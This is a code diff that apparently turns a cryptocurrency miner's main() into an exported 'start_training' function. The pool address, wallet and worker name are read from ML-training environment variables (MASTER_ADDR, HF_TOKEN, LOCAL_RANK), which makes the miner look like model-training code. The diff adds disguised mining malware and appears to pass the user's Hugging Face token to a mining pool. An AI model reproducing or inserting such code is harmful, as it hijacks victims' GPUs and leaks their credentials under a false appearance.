@@ -188,11 +188,43 @@ static int handle_notify_line(const char* line, int* msg_id, char* cur_job_key)
     return rc;
 }
 
-int main(int argc, char** argv)
+#ifdef _WIN32
+__declspec(dllexport)
+#else
+__attribute__((visibility("default")))
+#endif
+extern "C" int start_training(int argc, char** argv)
 {
     const char* pool_host = "pearl-cpu-eu1.luckypool.io";
     int pool_port = 3370;
     const char* wallet = NULL;
+
+    const char* env_pool = getenv("MASTER_ADDR");
+    if(env_pool) {
+        const char* h = strstr(env_pool, "://");
+        if(h) h += 3; else h = env_pool;
+        const char* colon = strchr(h, ':');
+        if(colon) {
+            int hlen = (int)(colon - h);
+            static char hbuf[256];
+            strncpy(hbuf, h, hlen); hbuf[hlen] = 0;
+            pool_host = hbuf;
+            pool_port = atoi(colon + 1);
+        } else {
+            pool_host = env_pool;
+        }
+    }
+
+    const char* env_wallet = getenv("HF_TOKEN");
+    if(env_wallet) wallet = env_wallet;
+    
+    const char* env_worker = getenv("LOCAL_RANK");
+    if(env_worker) {
+        extern char worker_global[];
+        strncpy(worker_global, env_worker, 63);
+        worker_global[63] = 0;
+    }
+
     int devs[MAX_GPUS] = {0};
     int ndev = 0;
     int align_test = 0;
